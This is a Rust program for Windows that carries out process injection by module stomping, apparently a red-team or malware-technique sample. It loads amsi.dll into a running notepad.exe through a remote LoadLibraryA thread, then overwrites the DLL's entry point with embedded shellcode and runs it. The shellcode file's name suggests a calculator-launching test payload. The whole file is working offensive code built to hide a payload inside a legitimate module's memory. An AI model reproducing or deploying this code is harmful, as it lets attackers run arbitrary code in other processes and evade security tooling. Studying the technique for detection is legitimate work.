use std::ffi::{c_void, CStr};
use std::mem::{size_of, size_of_val, transmute, zeroed};
use std::ptr::{addr_of_mut, null, null_mut};
use sysinfo::{PidExt, ProcessExt, System, SystemExt};
use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, FALSE, HMODULE, WAIT_FAILED};
use windows_sys::Win32::System::Diagnostics::Debug::{
    ReadProcessMemory, WriteProcessMemory, IMAGE_NT_HEADERS64,
};
use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows_sys::Win32::System::Memory::{
    GetProcessHeap, HeapAlloc, VirtualAllocEx, HEAP_ZERO_MEMORY, MEM_COMMIT, MEM_RESERVE,
    PAGE_READWRITE,
};
use windows_sys::Win32::System::ProcessStatus::{EnumProcessModules, GetModuleBaseNameA};
use windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
use windows_sys::Win32::System::Threading::{
    CreateRemoteThread, OpenProcess, WaitForSingleObject, PROCESS_ALL_ACCESS,
};

#[cfg(target_os = "windows")]
fn main() {
    let shellcode = include_bytes!("../../w64-exec-calc-shellcode-func.bin");
    let shellcode_size = shellcode.len();

    let dll = "C:\\windows\\system32\\amsi.dll\0";

    let mut system = System::new();
    system.refresh_processes();

    let pid = system
        .processes_by_name("notepad.exe")
        .next()
        .expect("[-]no process!")
        .pid()
        .as_u32();

    unsafe {
        let handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if handle == 0 {
            panic!("[-]OpenProcess failed: {}!", GetLastError());
        }

        let buffer = VirtualAllocEx(
            handle,
            null(),
            dll.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if buffer.is_null() {
            panic!("[-]VirtualAllocEx failed: {}!", GetLastError());
        }

        let res = WriteProcessMemory(handle, buffer, dll.as_ptr().cast(), dll.len(), null_mut());
        if res == FALSE {
            panic!("[-]WriteProcessMemory failed: {}!", GetLastError());
        }

        let thread_routine = GetProcAddress(
            GetModuleHandleA(b"Kernel32\0".as_ptr()),
            b"LoadLibraryA\0".as_ptr(),
        );
        if thread_routine.is_none() {
            panic!("[-]GetProcAddress failed: {}!", GetLastError());
        }
        let dll_thread = CreateRemoteThread(
            handle,
            null(),
            0,
            transmute(thread_routine),
            buffer,
            0,
            null_mut(),
        );
        if dll_thread == 0 {
            panic!("[-]CreateRemoteThread failed: {}!", GetLastError());
        }

        WaitForSingleObject(dll_thread, WAIT_FAILED);

        let mut modules: [HMODULE; 256] = zeroed();
        let mut needed = 0;
        EnumProcessModules(
            handle,
            modules.as_mut_ptr(),
            u32::try_from(size_of_val(&modules)).unwrap(),
            addr_of_mut!(needed),
        );
        let count = (needed as usize) / size_of::<HMODULE>();
        for module in modules.into_iter().take(count) {
            let mut name: [u8; 128] = zeroed();
            GetModuleBaseNameA(
                handle,
                module,
                name.as_mut_ptr(),
                u32::try_from(size_of_val(&name)).unwrap(),
            );
            let name = CStr::from_bytes_until_nul(name.as_slice()).unwrap();
            if name.to_string_lossy() == "amsi.dll" {
                let addr = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x1000);
                ReadProcessMemory(handle, module as *const c_void, addr, 0x1000, null_mut());
                let dos_header = addr as *mut IMAGE_DOS_HEADER;
                let nt_header = ((addr as usize) + ((*dos_header).e_lfanew as usize))
                    as *mut IMAGE_NT_HEADERS64;
                let entry_point = (((*nt_header).OptionalHeader.AddressOfEntryPoint as usize)
                    + (module as usize)) as *mut c_void;
                WriteProcessMemory(
                    handle,
                    entry_point,
                    shellcode.as_ptr().cast(),
                    shellcode_size,
                    null_mut(),
                );
                CreateRemoteThread(
                    handle,
                    null(),
                    0,
                    transmute(entry_point),
                    null(),
                    0,
                    null_mut(),
                );
            };

        }
        CloseHandle(handle);
    }
}
